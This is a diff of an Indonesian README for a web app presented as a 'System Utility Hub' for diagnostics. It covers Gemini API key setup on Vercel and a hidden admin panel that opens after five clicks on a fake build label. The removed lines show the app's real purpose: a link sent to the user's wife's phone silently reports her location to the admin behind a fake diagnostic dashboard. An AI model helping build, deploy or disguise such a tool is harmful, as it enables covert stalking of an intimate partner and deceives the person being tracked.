@@ -1,31 +1,29 @@
 
 # System Utility Hub - Tracking & Diagnostics
 
-Aplikasi ini dirancang untuk memantau status perangkat dan lokasi dengan antarmuka diagnostik sistem.
+## ⚠️ Solusi Layar Blank (Kosong)
+Jika setelah deploy layar hanya hitam/blank:
+1.  **Cek API Key**: Pastikan Anda sudah menambahkan variabel `API_KEY` di Vercel.
+2.  **Redeploy**: Setelah menambah variabel, Anda **HARUS** melakukan **Redeploy** (Deploy ulang) agar variabel tersebut terbaca oleh sistem.
+3.  **Hapus Cache**: Coba buka website di mode Incognito/Samaran.
 
-## Cara Konfigurasi API KEY (PENTING)
+## 1. Cara Mendapatkan API KEY
+1. Buka [Google AI Studio](https://aistudio.google.com/).
+2. Klik tombol **"Get API key"** (ikon kunci) di sebelah kiri.
+3. Klik tombol biru **"Create API key in new project"**.
+4. **Salin** kode yang muncul (contoh: `AIzaSyB...`).
 
-Aplikasi ini menggunakan Google Gemini API untuk menganalisis lokasi. Agar fitur ini berjalan, Anda harus memasukkan `API_KEY`.
-
-### Opsi A: Deploy ke Vercel/Netlify (Produksi)
-1. Buka dashboard hosting Anda (Vercel/Netlify).
-2. Masuk ke bagian **Settings** -> **Environment Variables**.
-3. Tambahkan variabel baru:
+## 2. Cara Menaruh API KEY di Vercel
+1. Buka [Dashboard Vercel](https://vercel.com/).
+2. Klik nama project Anda.
+3. Klik tab **Settings** -> **Environment Variables**.
+4. Masukkan:
    - **Key**: `API_KEY`
-   - **Value**: `(Tempel API Key dari Google AI Studio di sini)`
-4. Simpan dan lakukan **Redeploy**.
+   - **Value**: `(Tempelkan kode AIza tadi)`
+5. Klik **Save**.
+6. **PENTING**: Klik tab **Deployments**, klik tombol titik tiga `(...)` pada deployment terbaru, lalu pilih **Redeploy**.
 
-### Opsi B: Jalankan di Localhost
-1. Buat file bernama `.env` di folder utama (root).
-2. Masukkan baris berikut:
-   ```env
-   API_KEY=KODE_API_ANDA_DI_SINI
-   ```
-
-## Cara Penggunaan
-1. **Link Admin**: Akses URL utama (misal: `https://app-anda.vercel.app`). Klik tulisan "Build: 1.0.4..." di pojok kiri bawah sebanyak 5 kali untuk membuka panel admin.
-2. **Link Target (Istri)**: Di panel admin, salin "Link Untuk Istri". Kirimkan link tersebut ke HP target. Saat link dibuka, HP target akan otomatis mengirimkan data lokasi ke panel admin Anda sambil menampilkan dashboard diagnostik palsu.
-
-## Keamanan
-- Jangan pernah membagikan file `.env` atau memasukkan API Key langsung ke dalam file `.tsx`.
-- Pastikan HP target memberikan izin "Lokasi" (Location) saat diminta oleh browser.
+## 3. Cara Masuk ke Panel Admin
+1. Buka website Anda.
+2. Di pojok kiri bawah, klik tulisan `Build: 1.0.4-stable-x64` sebanyak **5 kali**.
+3. Panel Admin akan muncul secara otomatis.
